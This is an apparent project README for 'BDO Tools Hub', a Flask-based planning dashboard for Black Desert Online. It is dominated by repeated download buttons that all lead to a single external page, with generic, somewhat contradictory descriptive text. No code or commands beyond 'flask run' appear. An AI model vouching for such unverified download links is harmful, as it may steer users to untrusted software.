# BDO Tools Hub v2026 - Game Script Utility 2026

> **Black Desert Online planning dashboard for bartering, hunting, contribution points, and recurring tasks.** This browser-based companion combines progress tracking, calculators, notes, and activity planning in a single workspace.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/noah-bennettyux7194/bdo-tools-script-hub?style=flat-square)](https://github.com/noah-bennettyux7194/bdo-tools-script-hub)

---

<p align="center">
  <a href="https://noah-bennettyux7194.github.io/bdo-tools-script-hub/">
    <img src="https://img.shields.io/badge/Download-BDO%20Tools%20Hub%20Script-brightgreen?style=for-the-badge" alt="Download BDO Tools Hub Script">
  </a>
</p>

> **[Download BDO Tools Hub](https://noah-bennettyux7194.github.io/bdo-tools-script-hub/)**

---

[Download Latest Build](https://noah-bennettyux7194.github.io/bdo-tools-script-hub/)

---

## What the Dashboard Provides

BDO Tools Hub is a browser dashboard for organizing Black Desert Online planning and record keeping. It gathers tools for bartering calculations, hunting activity, contribution point lookup support, and task planning so routine preparation and longer-term progress can be managed from one location. The project is designed as a companion for planning sessions, not as a tool that performs actions inside the game.

Several activity-focused workflows are included. Users can calculate barter and hunting values, review previous hunting sessions, manage daily and weekly tasks that reset automatically, and record notes or silver totals. The CP workflow accepts profession levels through OCR-assisted extraction, while the application layout is based on Flask and Jinja2.

---

## Included Tools

- Calculate bartering costs for route planning and progression
- Record barter-related progress during sessions
- Estimate hunting drops and experience
- Review earlier hunting sessions through stored history
- Calculate CP with OCR-supported profession level input
- Organize daily and weekly tasks with automatic resets
- Save brief reminders and planning notes
- Keep silver totals visible for quick reference

---

## Installation and Launch

1. Get the latest build from the project page.
2. Copy the files into a local web project directory of your choice.
3. Start or open the Flask application according to your environment.
4. When templates and static resources are separated, confirm that both are available to the application.

A typical local startup command is:

    flask run

Use the appropriate application entry point instead if your setup starts Flask differently.

---

## Dashboard Controls

The available dashboard areas may include the following:

| Option | Purpose |
| --- | --- |
| Bartering calculator | Estimates costs and records progress |
| Hunting session tracker | Retains drops, XP, and session records |
| CP/OCR workflow | Extracts profession level information through OCR |
| Daily reset board | Resets recurring daily tasks according to schedule |
| Weekly reset board | Refreshes task lists on the weekly cycle |
| Notes panel | Stores short reminders and personal planning notes |
| Silver display | Provides an at-a-glance view of currency totals |

Where the build exposes configurable values, adjust them to match the local Flask and Jinja2 arrangement.

---

## Compatibility and Constraints

BDO Tools Hub is a web-oriented utility for Black Desert Online planning. It is intended to run through a browser and can be deployed locally or hosted within a Flask application structure.

Known limitations:

- This is not a native modification for the game client.
- OCR accuracy is affected by the quality of the source image or capture.
- Manual input may be necessary when text cannot be recognized reliably.
- The available dashboard behavior depends on the templates and files present in the selected build.

---

## Frequently Asked Questions

**What is the basic setup process?**  
Download the build, add it to your project directory, and run it through your Flask environment.

**Can the dashboard layout be changed?**  
Yes. The Jinja2 template layer can be modified to adapt the layout and displayed content.

**Are task lists and activity history supported?**  
Yes. The dashboard provides daily and weekly task sections along with history for tracked sessions.

**How should I handle incorrect OCR results?**  
Use a clearer source image or capture and verify that the text is readable before submitting it to the CP calculator.

**Is there a place for personal notes?**  
Yes. A notes area is available for reminders and planning information.

**How is information stored?**  
Data storage is determined by the way the Flask application is deployed and how its local files are arranged.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
